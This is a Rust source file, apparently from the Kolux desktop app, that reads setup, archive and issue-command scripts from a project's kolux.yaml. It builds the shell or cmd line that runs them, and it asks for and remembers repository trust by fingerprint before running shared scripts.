//! PROJ-033: a project's setup script, `scripts.setup` in the worktree's kolux.yaml, and the line
//! that runs it in a Setup terminal. A first line naming a POSIX shell (`#!/bin/bash -e`,
//! `#!/usr/bin/env sh`) runs it through that shell with the flags it declares; otherwise the
//! configured shell when that is a POSIX one; otherwise, on Windows, the command prompt, which
//! is refused a script it would misread (more than one line, `%`, `^` or `"`). Windows line
//! endings are accepted. The rest of kolux.yaml comes with PROJ-034 (T-149), so `scripts.setup`
//! is read with a small line scanner like the shared-folders list.
use std::path::{Path, PathBuf};

/// How the Setup terminal starts: the program, its arguments, and the script it runs.
#[derive(serde::Serialize, Debug, PartialEq, Clone)]
pub struct SetupLine {
    pub program: String,
    pub args: Vec<String>,
    pub script: String,
}

const POSIX: [&str; 7] = ["sh", "bash", "dash", "zsh", "ksh", "ash", "mksh"];

fn is_posix(program: &str) -> bool {
    let stem = Path::new(program).file_stem().map(|s| s.to_string_lossy().to_lowercase()).unwrap_or_default();
    POSIX.contains(&stem.as_str())
}

/// `scripts.setup` from kolux.yaml's text: a plain or quoted value on its line, or a `|` / `>`
/// block of the lines indented under it. None when there is none or it is blank.
pub fn setup_script(yaml: &str) -> Option<String> {
    scripts_entry(yaml, "setup")
}

/// `scripts.<key>` from kolux.yaml's text, read the way `setup_script` reads `scripts.setup`.
pub fn scripts_entry(yaml: &str, key: &str) -> Option<String> {
    yaml_entry(yaml, Some("scripts"), key)
}

/// PROJ-036: a top-level kolux.yaml value such as `issueCommand`, read the same way.
pub fn top_entry(yaml: &str, key: &str) -> Option<String> {
    yaml_entry(yaml, None, key)
}

/// `key` at the top level (`parent` None) or one level under `parent:`; plain, quoted or block.
fn yaml_entry(yaml: &str, parent: Option<&str>, key: &str) -> Option<String> {
    let prefix = format!("{key}:");
    let head = parent.map(|p| format!("{p}:"));
    let indent = |l: &str| l.len() - l.trim_start().len();
    let lines: Vec<&str> = yaml.lines().map(|l| l.trim_end_matches('\r')).collect();
    let mut in_scripts = false;
    for (i, line) in lines.iter().enumerate() {
        let t = line.trim();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let ind = indent(line);
        match &head {
            Some(h) if ind == 0 => {
                in_scripts = t == h;
                continue;
            }
            Some(_) if !in_scripts => continue,
            None if ind > 0 => continue,
            _ => {}
        }
        let Some(rest) = t.strip_prefix(prefix.as_str()) else { continue };
        let rest = rest.trim();
        let script = if rest.starts_with('|') || rest.starts_with('>') {
            let body: Vec<&str> = lines[i + 1..].iter().take_while(|l| l.trim().is_empty() || indent(l) > ind).copied().collect();
            let cut = body.iter().filter(|l| !l.trim().is_empty()).map(|l| indent(l)).min().unwrap_or(0);
            let kept: Vec<&str> = body.iter().map(|l| l.get(cut..).unwrap_or("")).collect();
            if rest.starts_with('>') {
                kept.iter().map(|l| l.trim()).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ")
            } else {
                kept.join("\n").trim_end().to_string()
            }
        } else {
            let quoted = rest.strip_prefix('"').and_then(|r| r.strip_suffix('"')).or_else(|| rest.strip_prefix('\'').and_then(|r| r.strip_suffix('\'')));
            quoted.map(str::to_string).unwrap_or_else(|| rest.split(" #").next().unwrap_or("").trim().to_string())
        };
        return Some(script).filter(|s| !s.trim().is_empty());
    }
    None
}

/// The shell a first `#!` line names and the flags it declares, when that shell is a POSIX one.
fn shebang(script: &str) -> Option<(String, Vec<String>)> {
    let first = script.lines().next()?.strip_prefix("#!")?;
    let mut words = first.split_whitespace();
    let mut program = words.next()?.to_string();
    if Path::new(&program).file_name().is_some_and(|n| n == "env") {
        program = words.by_ref().find(|w| !w.starts_with('-'))?.to_string();
    }
    is_posix(&program).then(|| (program, words.map(str::to_string).collect()))
}

/// What in a script the command prompt would misread, if anything.
fn cmd_trouble(script: &str) -> Option<&'static str> {
    if script.trim_end().contains('\n') {
        Some("it has more than one line, and cmd runs only the first")
    } else if script.contains('%') {
        Some("cmd would expand its % signs")
    } else if script.contains('^') {
        Some("cmd would drop its ^ signs")
    } else if script.contains('"') {
        Some("its quotes would reach cmd escaped")
    } else {
        None
    }
}

/// The line that runs `script`. `configured` is the shell a new terminal gets; `find` finds a
/// POSIX shell a `#!` line names (on Windows, Git's own bash, never WSL's launcher).
pub fn setup_line(script: &str, windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> Result<SetupLine, String> {
    let script = script.replace("\r\n", "\n");
    let line = |program: String, mut args: Vec<String>| {
        args.extend(["-c".to_string(), script.clone()]);
        SetupLine { program, args, script: script.clone() }
    };
    if let Some((shell, flags)) = shebang(&script) {
        let name = Path::new(&shell).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| shell.clone());
        let program = if windows {
            find(&name).ok_or_else(|| format!("The setup script asks for {name}, which was not found; install Git for Windows, or drop its #! line"))?.to_string_lossy().into_owned()
        } else {
            shell
        };
        return Ok(line(program, flags));
    }
    // STAT-055: a Windows batch file runs under the classic command prompt even when the shell is Git Bash.
    let first = script.split_whitespace().next().unwrap_or("").trim_matches('"').to_ascii_lowercase();
    let batch = windows && (first.ends_with(".bat") || first.ends_with(".cmd"));
    if let Some(shell) = configured.filter(|p| !batch && is_posix(&p.to_string_lossy())) {
        return Ok(line(shell.to_string_lossy().into_owned(), Vec::new()));
    }
    if !windows {
        return Ok(line("sh".into(), Vec::new()));
    }
    if let Some(why) = cmd_trouble(&script) {
        return Err(format!("The setup script was not run: it would go through cmd, and {why}. Start it with a #!/bin/sh line to run it through Git Bash."));
    }
    let script = script.trim_end().to_string();
    Ok(SetupLine { program: "cmd.exe".into(), args: vec!["/d".into(), "/s".into(), "/c".into(), script.clone()], script })
}

/// A POSIX shell by name on Windows: Git for Windows' own copy first, then one on the search
/// path that is not System32's WSL launcher.
fn find_posix(name: &str) -> Option<PathBuf> {
    let git = std::env::var_os("ProgramFiles").map(|p| PathBuf::from(p).join("Git").join("bin").join(format!("{name}.exe"))).filter(|p| p.is_file());
    git.or_else(|| crate::agents::find_program(name).filter(|p| !p.to_string_lossy().to_lowercase().contains("system32")))
}

/// The shell a new terminal gets, as setup and archive lines are built for it.
fn configured_shell() -> Option<PathBuf> {
    crate::pty::auto_shells(crate::agents::find_program, std::env::var_os("ComSpec").map(PathBuf::from)).into_iter().next().map(|(p, _)| p)
}

/// STAT-055: where a project's setup script comes from. By default the script kept in Kolux's
/// own settings for the repository wins even when kolux.yaml has one; the older shared-first
/// policy (`shared`) takes kolux.yaml's only. The bool says whether the script is the shared one.
/// Tests only: under `both` the script is the joined text, which trust must never be asked over
/// (use pick_parts, whose `shared` is the text to trust).
#[cfg(test)]
fn pick_setup(local: Option<&str>, shared: Option<String>, policy: Option<&str>) -> Option<(String, bool)> {
    pick_parts(local, shared, policy).map(|p| {
        let is_shared = p.shared.is_some();
        (p.script, is_shared)
    })
}

/// SET-033: the script that runs and, when it holds the repository's shared kolux.yaml script, that
/// script's own text. SAFE-025 trust is asked and remembered over `shared` alone, never over the
/// user's own text joined to it.
#[derive(Debug, PartialEq, Clone)]
pub struct Picked {
    pub script: String,
    pub shared: Option<String>,
    /// Why the two scripts could not be joined (`both`); nothing runs then and `script` is empty.
    pub refused: Option<String>,
}

/// SET-033: the own script and the shared one as one script that runs the first, then the second.
/// Two plain one-line commands join with `&&` (cmd runs that too, and a failed first stops the
/// second) when neither holds a `#` and the own one does not start with whitespace: on one line a
/// POSIX shell would read everything after a `#` as a comment, and kolux.yaml's part would silently
/// not run. Anything else joins by lines, for a POSIX shell, and a failed first part ends the script
/// before the second runs. The two must agree on the interpreter: the same `#!` line, or one `#!`
/// line beside a script that names none, and that line must name a POSIX shell, since a setup
/// script runs through a shell (or cmd), never through node or python. Otherwise the join is
/// refused with the reason.
fn join_both(local: &str, shared: &str) -> Result<String, String> {
    let (local, shared) = (local.trim_end_matches('\n'), shared.trim_end_matches('\n'));
    let plain = |s: &str| !s.contains('\n') && !s.contains('#');
    if plain(local) && plain(shared) && !local.starts_with(char::is_whitespace) {
        return Ok(format!("{} && {}", local.trim(), shared.trim()));
    }
    fn hashbang(s: &str) -> Option<&str> {
        s.lines().next().map(str::trim).filter(|l| l.starts_with("#!"))
    }
    let (own_line, shared_line) = (hashbang(local), hashbang(shared));
    let pick_one = "Pick just one of them on this page.";
    let not_posix = |l: &str| hashbang(l).is_some() && shebang(l.trim_start()).is_none();
    match (own_line, shared_line) {
        (Some(a), Some(b)) if a != b => return Err(format!("Your setup script starts with `{a}` and kolux.yaml's with `{b}`, so one script cannot run both. Give them the same #! line, or pick just one of them on this page.")),
        (Some(a), Some(_)) if not_posix(local) => return Err(format!("Both setup scripts start with `{a}`, which is not a POSIX shell, so Kolux cannot run them as one script. {pick_one}")),
        (Some(a), None) if not_posix(local) => return Err(format!("Your setup script starts with `{a}`, which is not a POSIX shell, so one script cannot run it and kolux.yaml's setup script together. {pick_one}")),
        (None, Some(b)) if not_posix(shared) => return Err(format!("kolux.yaml's setup script starts with `{b}`, which is not a POSIX shell, so one script cannot run it and your setup script together. {pick_one}")),
        _ => {}
    }
    let body = |s: &str, line: Option<&str>| if line.is_some() { s.split_once('\n').map_or("", |(_, rest)| rest).to_string() } else { s.to_string() };
    let (own, theirs) = (body(local, own_line), body(shared, shared_line));
    let head = own_line.or(shared_line).map(|l| format!("{l}\n")).unwrap_or_default();
    Ok(format!("{head}{}\nkolux_setup_status=$?\n[ \"$kolux_setup_status\" -eq 0 ] || exit \"$kolux_setup_status\"\n{theirs}", own.trim_end_matches('\n')))
}

/// SET-033: why `both` could not run `local` then `shared` on this PC, if it could not: the two
/// cannot be joined, or the joined script would go through cmd, which misreads it.
fn both_trouble(local: &str, shared: &str, windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> Option<String> {
    let joined = match join_both(local, shared) {
        Ok(j) => j,
        Err(why) => return Some(why),
    };
    setup_line(&joined, windows, configured, find).err()
}

/// SET-033: pick_setup, plus the policy `both`, which runs the user's own setup and then the shared
/// one when both exist (the one that exists, when only one does).
pub fn pick_parts(local: Option<&str>, shared: Option<String>, policy: Option<&str>) -> Option<Picked> {
    let local = local.map(|l| l.replace("\r\n", "\n")).filter(|l| !l.trim().is_empty());
    let own = |l: String| Picked { script: l, shared: None, refused: None };
    let theirs = |s: String| Picked { script: s.clone(), shared: Some(s), refused: None };
    match policy {
        Some("shared") | Some("shared-first") => shared.map(theirs),
        Some("both") => match (local, shared) {
            (Some(l), Some(s)) => Some(match join_both(&l, &s.replace("\r\n", "\n")) {
                Ok(script) => Picked { script, shared: Some(s), refused: None },
                Err(why) => Picked { script: String::new(), shared: None, refused: Some(why) },
            }),
            (Some(l), None) => Some(own(l)),
            (None, s) => s.map(theirs),
        },
        _ => local.map(own).or_else(|| shared.map(theirs)),
    }
}

/// STAT-055: the main folder of the repository the worktree at `worktree` belongs to, read from
/// its `.git` file (`gitdir: <main>/.git/worktrees/<name>`); the folder itself otherwise.
pub fn main_folder(worktree: &Path) -> PathBuf {
    let gitdir = std::fs::read_to_string(worktree.join(".git")).ok().and_then(|t| t.lines().next().and_then(|l| l.strip_prefix("gitdir:")).map(|d| PathBuf::from(d.trim())));
    gitdir
        .as_deref()
        .and_then(Path::parent)
        .filter(|p| p.file_name().is_some_and(|n| n == "worktrees"))
        .and_then(Path::parent)
        .and_then(Path::parent)
        .map(Path::to_path_buf)
        .unwrap_or_else(|| worktree.to_path_buf())
}

/// STAT-055 / COMPAT 5.5: the variables a setup or archive script is given.
pub fn script_vars(root: &Path, worktree: &Path) -> Vec<(&'static str, String)> {
    let name = worktree.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    vec![("KOLUX_ROOT_PATH", root.to_string_lossy().into_owned()), ("KOLUX_WORKTREE_PATH", worktree.to_string_lossy().into_owned()), ("KOLUX_WORKSPACE_NAME", name)]
}

/// STAT-055: conda's variables, cleared for a script when the environment is only partly active.
pub const CONDA_VARS: [&str; 4] = ["CONDA_PREFIX", "CONDA_DEFAULT_ENV", "CONDA_SHLVL", "CONDA_PROMPT_MODIFIER"];

/// STAT-055: a conda environment named in CONDA_PREFIX whose folder is not on the search path is
/// only partly active, and a script must not inherit it.
pub fn conda_partial(prefix: Option<&str>, path: &str) -> bool {
    let norm = |s: &str| s.replace('\\', "/").trim_end_matches('/').to_lowercase();
    let Some(p) = prefix.map(norm).filter(|p| !p.is_empty()) else { return false };
    !std::env::split_paths(path).any(|d| norm(&d.to_string_lossy()).starts_with(&p))
}

fn conda_now() -> bool {
    conda_partial(std::env::var("CONDA_PREFIX").ok().as_deref(), &std::env::var("PATH").unwrap_or_default())
}

/// STAT-055: `line` with `vars` set and `unset` cleared ahead of its script, so a Setup terminal
/// started from it sees them: `export` lines for a POSIX shell, `set NAME=value&&` for cmd (a value
/// cmd would misread is left out there). The script itself (`line.script`) is unchanged.
pub fn with_env(mut line: SetupLine, vars: &[(&str, String)], unset: &[&str]) -> SetupLine {
    let cmd = line.program.eq_ignore_ascii_case("cmd.exe");
    let Some(last) = line.args.last_mut() else { return line };
    let pre: String = if cmd {
        let plain = |v: &str| !v.chars().any(|c| "&|<>^%\"\r\n".contains(c));
        vars.iter().filter(|(_, v)| plain(v)).map(|(k, v)| format!("set {k}={v}&& ")).chain(unset.iter().map(|k| format!("set {k}=&& "))).collect()
    } else {
        let quote = |v: &str| format!("'{}'", v.replace('\'', "'\\''"));
        let mut s: String = vars.iter().map(|(k, v)| format!("export {k}={}\n", quote(v))).collect();
        if !unset.is_empty() {
            s.push_str(&format!("unset {}\n", unset.join(" ")));
        }
        s
    };
    *last = format!("{pre}{last}");
    line
}

/// STAT-055: the Setup terminal's line for the worktree at `path`: its setup script from
/// `local` (Kolux's own setting for the repository) or the worktree's kolux.yaml as `policy`
/// says, with the setup variables set.
/// SAFE-025: a shared kolux.yaml script runs only once its repository trusts it.
#[tauri::command(async)]
pub fn workspace_setup(store: StoreState<'_>, path: String, local: Option<String>, policy: Option<String>) -> Result<Option<SetupLine>, String> {
    let (local, policy) = setup_inputs(&store, &path, local, policy);
    setup_for(&path, local, policy, &|root, kind, script| require_trust(&store, root, kind, script))
}

/// STAT-055: workspace_setup's line, with `trust` asked before a shared script is used.
fn setup_for(path: &str, local: Option<String>, policy: Option<String>, trust: Gate<'_>) -> Result<Option<SetupLine>, String> {
    setup_for_on(path, local, policy, trust, cfg!(windows), configured_shell().as_deref(), find_posix)
}

/// setup_for on the platform given: `windows`, the `configured` shell and the POSIX shell finder.
fn setup_for_on(path: &str, local: Option<String>, policy: Option<String>, trust: Gate<'_>, windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> Result<Option<SetupLine>, String> {
    let wt = Path::new(path);
    let shared = std::fs::read_to_string(wt.join(crate::include::CONFIG_FILE)).ok().and_then(|t| setup_script(&t));
    let Some(Picked { script, shared, refused }) = pick_parts(local.as_deref(), shared, policy.as_deref()) else { return Ok(None) };
    // SET-033: two scripts that cannot share an interpreter run nothing, and nothing is asked about trust
    if let Some(why) = refused {
        return Err(why);
    }
    // FIX-2: the same for a script this PC cannot run (a join cmd would misread, a #! shell it lacks):
    // the line is built, and refused, before the question
    let line = setup_line(&script, windows, configured, find)?;
    if let Some(theirs) = shared {
        trust(&main_folder(wt), "setup", &theirs)?;
    }
    let unset: &[&str] = if conda_now() { &CONDA_VARS } else { &[] };
    Ok(Some(with_env(line, &script_vars(&main_folder(wt), wt), unset)))
}

/// STAT-055: runs kolux.yaml's archive script (read from the worktree being removed; OD-14: no
/// per-repository archive setting) in that worktree with the script variables, before it goes,
/// and waits up to `limit`, then ends it and every process it started. Ok(false) when there is
/// none, Ok(true) when it ran and exited 0; otherwise the failure, ending with the last of what
/// the script wrote to its error output, for the UI to show. `trusted` is asked about the exact text
/// read here (so what was checked is what runs); false skips it, Ok(false). One this PC cannot start
/// (a #! shell it lacks, a line cmd would misread) is skipped too, before the question (as FIX-2 does
/// for setup): it would run nothing, so it must not keep the workspace from being deleted.
pub fn run_archive(root: &Path, worktree: &Path, limit: std::time::Duration, trusted: &dyn Fn(&str) -> Result<bool, String>) -> Result<bool, String> {
    let Some(script) = std::fs::read_to_string(worktree.join(crate::include::CONFIG_FILE)).ok().and_then(|y| scripts_entry(&y, "archive")) else { return Ok(false) };
    let Ok(line) = setup_line(&script, cfg!(windows), configured_shell().as_deref(), find_posix) else { return Ok(false) };
    if !trusted(&script)? {
        return Ok(false);
    }
    let mut cmd = std::process::Command::new(&line.program);
    cmd.args(&line.args).current_dir(worktree).stdin(std::process::Stdio::null()).stdout(std::process::Stdio::null()).stderr(std::process::Stdio::piped());
    cmd.envs(script_vars(root, worktree));
    if conda_now() {
        for k in CONDA_VARS {
            cmd.env_remove(k);
        }
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000); // no console window
    }
    let mut child = cmd.spawn().map_err(|e| format!("The archive script could not start: {e}"))?;
    // Everything the script starts joins a kill-on-close job, so ending it ends the whole tree,
    // even a process started while the kill runs. ponytail: one started in the few ms before the
    // child is assigned escapes the job; kill_tree below still ends it when the script is stopped.
    let mut job = crate::procs::Job::new().ok().filter(|j| j.assign_pid(child.id()).is_ok());
    // The error output is read on its own thread, so a chatty script never stalls on a full pipe.
    let said = child.stderr.take().map(|mut e| {
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || tx.send(tail_of(&mut e)));
        rx
    });
    let start = std::time::Instant::now();
    let status = loop {
        if let Some(status) = child.try_wait().map_err(|e| format!("The archive script could not be watched: {e}"))? {
            break Some(status);
        }
        if start.elapsed() >= limit {
            drop(job.take()); // a server the script started holds the folder too
            crate::procs::kill_tree(child.id());
            let _ = child.kill();
            let _ = child.wait();
            break None;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    };
    let why = |msg: String| {
        let text = said.as_ref().and_then(|rx| rx.recv_timeout(std::time::Duration::from_secs(2)).ok()).unwrap_or_default();
        match text.trim() {
            "" => msg,
            t => format!("{msg}: {t}"),
        }
    };
    match status {
        Some(s) if s.success() => Ok(true),
        Some(s) => Err(why(match s.code() {
            Some(c) => format!("The archive script failed with exit code {c}"),
            None => "The archive script was ended".into(),
        })),
        None => Err(why(format!("The archive script was stopped after {} seconds", limit.as_secs()))),
    }
}

/// The last 2 KB of what `r` gives until it closes, as text.
fn tail_of(r: &mut impl std::io::Read) -> String {
    const KEEP: usize = 2048;
    let (mut keep, mut buf) = (Vec::new(), [0u8; 4096]);
    while let Ok(n @ 1..) = r.read(&mut buf) {
        keep.extend_from_slice(&buf[..n]);
        if keep.len() > KEEP {
            keep.drain(..keep.len() - KEEP);
        }
    }
    String::from_utf8_lossy(&keep).into_owned()
}

/// STAT-055 (T-715): removal's archive step for the worktree at `wt` of the project at `root`.
/// SAFE-025: the script runs only when the repository trusts that exact text (the page asks first,
/// script_trust_needed with kind "archive"); one it does not trust (Don't run, or nobody asked) is
/// skipped and the removal goes on, as is one whose trust cannot be read. Ok(true) when it ran and
/// exited 0.
pub fn archive_on_remove(store: &std::sync::Mutex<crate::state::Store>, root: &Path, wt: &Path) -> Result<bool, String> {
    run_archive(root, wt, std::time::Duration::from_secs(120), &|script| Ok(store.lock().is_ok_and(|s| matches!(trust_ask(&s, root, "archive", script), Ok(None)))))
}

type StoreState<'a> = tauri::State<'a, std::sync::Mutex<crate::state::Store>>;
/// SAFE-025: asked with the repository's main folder, the script's kind and its text before a shared
/// script is used; an error is why it may not run.
type Gate<'a> = &'a dyn Fn(&Path, &str, &str) -> Result<(), String>;

/// SAFE-025 / STAT-056: the store key holding one project's script trust. Keyed by the project's
/// id, which a project added again gets new, so removing or re-adding a repository forgets it.
pub const TRUST_PREFIX: &str = "scriptTrust:";
/// SAFE-025: the shared scripts that need trust. The VM recipe is not carried (COMPAT 14); "tabs"
/// is the default tabs' commands of PROJ-034 (T-149), approved as one text.
pub const TRUST_KINDS: [&str; 4] = ["setup", "archive", "issue", "tabs"];

/// SAFE-025: one project's trust: the whole kolux.yaml, or each script's approved fingerprint.
#[derive(serde::Serialize, serde::Deserialize, Default, Debug, PartialEq, Clone)]
struct Trust {
    #[serde(default)]
    all: bool,
    #[serde(default)]
    scripts: std::collections::BTreeMap<String, String>,
    /// Row 887: fields a newer build wrote, carried through a save; a non-object blob (`[]`) fails to decode.
    #[serde(flatten)]
    extra: serde_json::Map<String, serde_json::Value>,
}

/// SAFE-025: what the trust prompt shows: the script that would run, of which kind, for which
/// project, and whether an approved version of it has since changed.
#[derive(serde::Serialize, Debug, PartialEq, Clone)]
pub struct TrustAsk {
    pub kind: String,
    pub script: String,
    pub changed: bool,
    pub project: String,
}

/// SAFE-025: the fingerprint approval is remembered by: SHA-256 of the script with its line ends
/// made plain, so a checkout that turns them into CRLF does not ask again.
pub fn fingerprint(script: &str) -> String {
    use sha2::{Digest, Sha256};
    Sha256::digest(script.replace("\r\n", "\n").as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

fn trust_project(store: &crate::state::Store, root: &Path) -> Result<crate::projects::Project, String> {
    crate::projects::load_projects(store)
        .into_iter()
        .find(|p| crate::projects::same_folder(Path::new(&p.path), root))
        .ok_or_else(|| format!("Kolux cannot check whether {} is trusted (it is not one of your projects), so its kolux.yaml scripts do not run", root.display()))
}

fn kind_ok(kind: &str) -> Result<(), String> {
    TRUST_KINDS.contains(&kind).then_some(()).ok_or_else(|| format!("{kind} is not a kolux.yaml script"))
}

/// SAFE-025 / STAT-056: None when the project at `root` trusts this `kind` of script with this text
/// (or trusts its whole kolux.yaml); else what to ask. An error (no such project, an unreadable
/// record) means trust cannot be checked, and nothing runs.
pub fn trust_ask(store: &crate::state::Store, root: &Path, kind: &str, script: &str) -> Result<Option<TrustAsk>, String> {
    kind_ok(kind)?;
    let project = trust_project(store, root)?;
    let why = |e: String| format!("Kolux could not read whether {} is trusted ({e}), so its kolux.yaml scripts do not run", project.name);
    let trust: Trust = match store.get(&format!("{TRUST_PREFIX}{}", project.id)).map_err(|e| why(e.to_string()))? {
        None => Trust::default(),
        Some(s) => serde_json::from_str(&s).map_err(|e| why(e.to_string()))?,
    };
    let approved = trust.scripts.get(kind);
    if trust.all || approved.is_some_and(|f| *f == fingerprint(script)) {
        return Ok(None);
    }
    Ok(Some(TrustAsk { kind: kind.into(), script: script.into(), changed: approved.is_some(), project: project.name }))
}

/// SAFE-025: approves this `kind` of script with exactly this text for the project at `root`, and
/// with `always`, its whole kolux.yaml. An unreadable record is replaced.
pub fn trust_grant(store: &crate::state::Store, root: &Path, kind: &str, script: &str, always: bool) -> Result<(), String> {
    kind_ok(kind)?;
    let project = trust_project(store, root)?;
    let key = format!("{TRUST_PREFIX}{}", project.id);
    let mut trust: Trust = crate::orchestration::kept::load(store, &key)?;
    trust.scripts.insert(kind.into(), fingerprint(script));
    trust.all |= always;
    store.set(&key, &serde_json::to_string(&trust).map_err(|e| e.to_string())?).map_err(|e| format!("Kolux could not save the trust ({e})"))
}

/// T-721: what the project at `root` trusts, for its page: Always trust, and the scripts approved one by one.
/// Nothing when it is not a project or the record cannot be read (then nothing runs unasked either).
fn trust_seen(store: &crate::state::Store, root: &Path) -> (bool, Vec<String>) {
    let Ok(p) = trust_project(store, root) else { return (false, vec![]) };
    let t: Trust = store.get(&format!("{TRUST_PREFIX}{}", p.id)).ok().flatten().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default();
    (t.all, t.scripts.into_keys().collect())
}

/// T-721: Stop trusting forgets the project's whole record, so each kolux.yaml script asks again.
pub fn trust_clear(store: &crate::state::Store, root: &Path) -> Result<(), String> {
    let p = trust_project(store, root)?;
    store.set(&format!("{TRUST_PREFIX}{}", p.id), "{}").map_err(|e| format!("Kolux could not stop trusting {} ({e})", p.name))
}

/// SAFE-025: Ok when the shared script may run; else why not, for the UI to show.
fn require_trust(store: &std::sync::Mutex<crate::state::Store>, root: &Path, kind: &str, script: &str) -> Result<(), String> {
    let store = store.lock().map_err(|_| "Kolux could not check this repository's trust, so its kolux.yaml scripts do not run".to_string())?;
    match trust_ask(&store, root, kind, script)? {
        None => Ok(()),
        Some(ask) => Err(format!(
            "The {} in kolux.yaml did not run: {}",
            match kind {
                "setup" => "setup script",
                "archive" => "archive script",
                "tabs" => "default tab commands",
                _ => "issue command",
            },
            if ask.changed { "it changed since you trusted it" } else { "this repository's scripts are not trusted yet" }
        )),
    }
}

/// SAFE-025: the shared kolux.yaml script of `kind` that would run for the worktree at `wt` of the
/// repository at `root`; None when the one that would run is the user's own, or there is none.
fn shared_script(kind: &str, root: &Path, wt: &Path, local: Option<&str>, policy: Option<&str>) -> Option<String> {
    shared_script_on(kind, root, wt, local, policy, cfg!(windows), configured_shell().as_deref(), find_posix)
}

/// shared_script on the platform given (see setup_for_on).
#[allow(clippy::too_many_arguments)]
fn shared_script_on(kind: &str, root: &Path, wt: &Path, local: Option<&str>, policy: Option<&str>, windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> Option<String> {
    let yaml = || std::fs::read_to_string(wt.join(crate::include::CONFIG_FILE)).ok();
    match kind {
        // FIX-2: the question is asked only over a script that would run here; a refused join, a join
        // cmd would misread or a #! shell this PC lacks runs nothing, so nothing is asked (setup_for_on agrees)
        "setup" => pick_parts(local, yaml().and_then(|t| setup_script(&t)), policy).filter(|p| p.refused.is_none() && setup_line(&p.script, windows, configured, find).is_ok()).and_then(|p| p.shared),
        // T-715: likewise an archive script this PC cannot start is skipped by run_archive, so not asked about
        "archive" => yaml().and_then(|y| scripts_entry(&y, "archive")).filter(|s| setup_line(s, windows, configured, find).is_ok()),
        "issue" => issue_command(root, wt).filter(|(_, s)| *s).map(|(c, _)| c),
        // PROJ-034: the default tabs' commands, asked as one text (see `shared_tabs`)
        "tabs" => shared_tabs(root, wt).ok().and_then(|tabs| tabs_trust_text(&tabs)),
        _ => None,
    }
}

/// SAFE-025 / STAT-056: what the trust prompt must ask before the `kind` script runs for the
/// worktree at `path` (`root` is the repository's main folder for the issue command; `local` and
/// `policy` as workspace_setup takes them); None when nothing shared would run or it is trusted.
#[tauri::command(async)]
pub fn script_trust_needed(store: StoreState<'_>, path: String, kind: String, root: Option<String>, local: Option<String>, policy: Option<String>) -> Result<Option<TrustAsk>, String> {
    kind_ok(&kind)?;
    let wt = Path::new(&path);
    let root = root.map(PathBuf::from).unwrap_or_else(|| main_folder(wt));
    let (local, policy) = setup_inputs(&store, &path, local, policy);
    // git runs (the issue override check) before the store is locked
    let Some(script) = shared_script(&kind, &root, wt, local.as_deref(), policy.as_deref()) else { return Ok(None) };
    let store = store.lock().map_err(|_| "Kolux could not check this repository's trust, so its kolux.yaml scripts do not run".to_string())?;
    trust_ask(&store, &root, &kind, &script)
}

/// SAFE-025: the user chose Run hooks on the prompt for `script` (the text it showed).
#[tauri::command(async)]
pub fn script_trust_grant(store: StoreState<'_>, path: String, kind: String, script: String, always: bool, root: Option<String>) -> Result<(), String> {
    let root = root.map(PathBuf::from).unwrap_or_else(|| main_folder(Path::new(&path)));
    let store = store.lock().map_err(|_| "Kolux could not save the trust".to_string())?;
    trust_grant(&store, &root, &kind, &script, always)
}

/// PROJ-036 / COMPAT 5.6: the per-user issue command, a file in the main folder's .kolux folder
/// that git does not track; its whole text is the command. It wins over kolux.yaml's. A tracked
/// one, or one in a worktree (which only holds what the branch committed), is anyone's text and
/// never counts as the user's own.
pub const ISSUE_OVERRIDE: &str = ".kolux/issue-command";
/// PROJ-036: kolux.yaml's shared issue command key (COMPAT 5.6).
pub const ISSUE_KEY: &str = "issueCommand";

/// PROJ-036: the issue command for a workspace at `worktree` of the repository at `root`, and
/// whether it is the shared one: the local override in the main folder, while git does not track
/// it, wins; else `issueCommand` from the worktree's kolux.yaml, else the main folder's.
pub fn issue_command(root: &Path, worktree: &Path) -> Option<(String, bool)> {
    let read = |p: PathBuf| std::fs::read_to_string(p).ok().map(|t| t.trim_start_matches('\u{feff}').trim().replace("\r\n", "\n")).filter(|t| !t.is_empty());
    if let Some(local) = read(root.join(ISSUE_OVERRIDE)).filter(|_| untracked(root, ISSUE_OVERRIDE)) {
        return Some((local, false));
    }
    [worktree, root].iter().find_map(|d| std::fs::read_to_string(d.join(crate::include::CONFIG_FILE)).ok().and_then(|y| top_entry(&y, ISSUE_KEY))).map(|c| (c, true))
}

/// Whether git, asked in `repo`, tracks nothing at `rel` in any capitals (NTFS opens a committed
/// `.KOLUX/Issue-Command` through the lower-case path, so the pathspec ignores case), and no part of
/// `rel` is a link (git does not look through a symlinked folder, so a link could read tracked text
/// through an untracked path); false when git cannot tell (not a repository, no git), so an unproven
/// file never counts as the user's own.
fn untracked(repo: &Path, rel: &str) -> bool {
    let mut at = repo.to_path_buf();
    for part in rel.split('/') {
        at.push(part);
        if std::fs::symlink_metadata(&at).map_or(true, |m| m.file_type().is_symlink()) {
            return false;
        }
    }
    let spec = format!(":(icase){rel}");
    matches!(crate::git::run(&["ls-files", "--", &spec], Some(repo)), Ok(out) if out.is_empty())
}

/// PROJ-036: the issue filled into the command: `{{issue}}` becomes its number and `{{issueUrl}}`
/// its address (only an address of plain URL characters; anything else becomes empty, so nothing
/// from GitHub can reach the shell as code); a command with neither gets the number as its last
/// word. The issue's title is never put in: anyone can write it.
pub fn fill_issue(command: &str, number: u64, url: &str) -> String {
    let safe = url.starts_with("https://") && url.chars().all(|c| c.is_ascii_alphanumeric() || "-._~:/".contains(c));
    let url = if safe { url } else { "" };
    if command.contains("{{issue}}") || command.contains("{{issueUrl}}") {
        command.replace("{{issueUrl}}", url).replace("{{issue}}", &number.to_string())
    } else {
        format!("{} {number}", command.trim_end())
    }
}

/// PROJ-036: what runs the issue command, and where it came from (a shared one needs the
/// repository's trust first, SAFE-025).
